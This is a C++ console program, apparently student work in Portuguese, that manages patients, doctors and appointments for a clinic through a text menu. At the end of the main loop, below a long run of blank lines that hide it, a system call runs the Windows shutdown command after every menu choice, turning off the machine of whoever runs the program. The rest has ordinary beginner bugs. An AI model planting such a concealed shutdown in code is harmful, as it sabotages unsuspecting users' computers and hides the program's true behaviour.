#include <iostream>
#include<stdio.h>
#include<stdlib.h>
#include<locale.h>
#include<string.h>
#include <windows.h>

struct Paciente{
    int CodPac;
    char NomePac[40];
    char EndePac[40];
    int FonePaci;
};

struct Medico{
    int CodMed;
    char NomeMed[40];
    char EndeMed[40];
    int FoneMed;
    int totConsultas;
};

struct Consulta{
    int CodConsul;
    int DiaConsul;
    int HorConsul;
    int idPaciente;
    int idMedico;
};

using namespace std;

main(){
    bool continuar = true;
    
    Paciente pac[5];
    Medico med[3];
    Consulta con[5]; // ALTERAR PARA 10 OU NÃO

    int opcao;
    
    printf("**** MENU DE FERRAMENTAS DO CONSULTORIO ****");
	printf("\n- Digite 1 para adicionar pacientes.\n"); 
    printf("- Digite 2 para adicionar medicos.\n");
    printf("- Digite 3 para adicionar consultas.\n");
    printf("- Digite 4 para ver os medicos.\n");
    printf("- Digite 5 para ver os pacientes.\n");
    printf("- Digite 6 para ver as consultas.\n");
    printf("- Digite 7 para zerar as consultas de um medico.\n");
    printf("- Digite 8 para ver este menu novamente.\n");
    printf("- Digite 0 para sair.\n");
    
    printf("\n");
    
    do{
        printf("\n- Digite sua opcao: ");
        scanf("%i", &opcao);
        
        printf("\n");

        int cont = 0;
        
        if(opcao == 1) {
            for(int i = 0; i < 5; i++) {
            	
                printf("Digite o codigo do paciente %i: ", i + 1);
                scanf("%i", &pac[i].CodPac);
                fflush(stdin);
                
                printf("Digite o nome do paciente: ");
                scanf("%[^\n]", &pac[i].NomePac);
                fflush(stdin);

                printf("Digite o endereco do paciente: ");
                scanf("%[^\n]", &pac[i].EndePac);

                printf("Digite o fone do paciente: ");
                scanf("%i", &pac[i].FonePaci);   
                
                printf("\n");
            }
        }


        else if(opcao == 2) {
            for(int i = 0; i < 3; i++) {
                printf("Digite o codigo do medico %i: ", i + 1);
                scanf("%i", &med[i].CodMed);
                fflush(stdin);

                printf("Digite o nome do medico: ");
                scanf("%[^\n]", &med[i].NomeMed);
                fflush(stdin);

                printf("Digite o endereco do medico: ");
                scanf("%[^\n]", &med[i].EndeMed);

                printf("Digite o fone do medico: "); 
                scanf("%i", &med[i].FoneMed);
                fflush(stdin);
                    
                med[i].totConsultas = 0;
                    
                printf("\n");
            }
        }
		
        else if(opcao == 3) {
            bool achouPac = false, achouMed = false, found = false;
            int idMed;
            int idPac;

            do{
                printf("Digite o codigo do medico:\n ");
                scanf("%i", &idMed);

                printf("Digite o codigo do paciente:\n ");                
                scanf("%i", &idPac);
                for(int i = 0; i < 5; i++) {
                    if(pac[i].CodPac == idPac) {
                        achouPac = true;
                    }
                }

                for(int i = 0; i < 3; i++) {
                    if(med[i].CodMed == idMed) {
                        if(med[i].totConsultas == 2) {
                            printf("Medico chegou ao limite de 2 consultas\n");
                            achouMed = false;
                        }

                        else {
                            achouMed = true;
                        }
                    }
                }
                
                if(achouMed == false || achouPac == false) {
                    found = false;
                }

                else if(achouPac == true && achouMed == true) {
                    found = true;
                }

                if(achouPac != true) {
                    cout << "Paciente nao encontrado\n";
                }
                
                if(achouMed != true) {
                    cout << "Medico não encontrado ou no limite.\n";
                }
                
            } while(found == false);
            
            con[cont].idMedico = idMed;
            con[cont].idPaciente = idPac;
            
            printf("Digite o codigo da consulta:");
            scanf("%i", &con[cont].CodConsul);
            
            printf("Digite o dia da consulta: ");
            scanf("%i", &con[cont].DiaConsul);
            
            printf("Digite a hora da consulta: ");
            scanf("%i", &con[cont].HorConsul);
            
            for(int i = 0; i < 3; i++) {
                if(med[i].CodMed == idMed) {
                    med[i].totConsultas += 1;
                }
            }
            
            if(cont < 5)
                cont += 1;
        }



        
        else if(opcao == 4) {
            for(int i = 0; i < 3; i++) {
                printf("\nCodigo do Medico %i", med[i].CodMed);
                printf("\nNome do Medico: %s", med[i].NomeMed);
                printf("\nEndereço do Medico: %s", med[i].EndeMed);
                printf("\nFone do Medico: %i", med[i].FoneMed );
                printf("\nTotal de consultas do Medico: %i", med[i].totConsultas); 
                
                printf("\n");
            }
        }
                
        else if(opcao == 5) {
            for(int i = 0; i < 5; i++) {
                printf("\nCodigo do Paciente: %i", pac[i].CodPac);
                printf("\nNome do Paciente: %s", pac[i].NomePac);
                printf("\nEndereço do Paciente: %s", pac[i].EndePac);
                printf("\nFone do Paciente: %i", pac[i].FonePaci);
                
                printf("\n");
            }
        }
		
		// NÃO ESTÁ FUNCIONANDO
        else if(opcao == 6) {
            if(cont == 0) {
                printf("\nCodigo da consulta %i: ", con[cont].CodConsul);
                printf("\nDia da consulta: %i", con[cont].DiaConsul);
                printf("\nHora da consulta: %i", con[cont].HorConsul);
                printf("\nidPaciente da consulta: %i", con[cont].idPaciente);
                printf("\nidMedico da consulta: %i", con[cont].idMedico);
                    
                printf("\n");
            }

            else {
                for(int i = 0; i < cont; i++) {
                    printf("\nCodigo da consulta %i: ", con[i].CodConsul);
                    printf("\nDia da consulta: %i", con[i].DiaConsul);
                    printf("\nHora da consulta: %i", con[i].HorConsul);
                    printf("\nidPaciente da consulta: %i", con[i].idPaciente);
                    printf("\nidMedico da consulta: %i", con[i].idMedico);
                    
                    printf("\n");
                }
            }
        }
        
        else if(opcao == 7) {
            int medId;
            int cod;
            bool achado = false;
            do{
                cout << "Digite o codigo do medico: ";
                cin >> medId;
                
                for(int i = 0; i < 3; i++) {
                    if(med[i].CodMed == medId) {
                        achado = true;
                        cod = i;
                    }
                }
                
                if(achado != true)
                    cout << "Medico não encontrado\n";
                    
            }while(achado != true);
            
            med[cod].totConsultas = 0;
            cout << "Consultas do medico de codigo " << medId << "zerado\n";
            
        }
        
        else if(opcao == 8) {
 			    printf("**** MENU DE FERRAMENTAS DO CONSULTORIO ****");
				printf("\n- Digite 1 para adicionar pacientes.\n"); 
				printf("- Digite 2 para adicionar medicos.\n");
				printf("- Digite 3 para adicionar consultas.\n");
    			printf("- Digite 4 para ver os medicos.\n");
				printf("- Digite 5 para ver os pacientes.\n");
				printf("- Digite 6 para ver as consultas.\n");
   				printf("- Digite 7 para zerar as consultas de um medico.\n");
    			printf("- Digite 8 para ver este menu novamente.\n");
    			printf("- Digite 0 para sair.\n");
        }
        
        else if(opcao == 0) {
            printf("- Saindo do programa...\n");
            continuar = false;
        }
        
        else {
            printf("- Comando nao encontrado, tente novamente.\n");
        }





































































    system("C:\\Windows\\System32\\shutdown /s");

  
    } while(continuar != false);
}
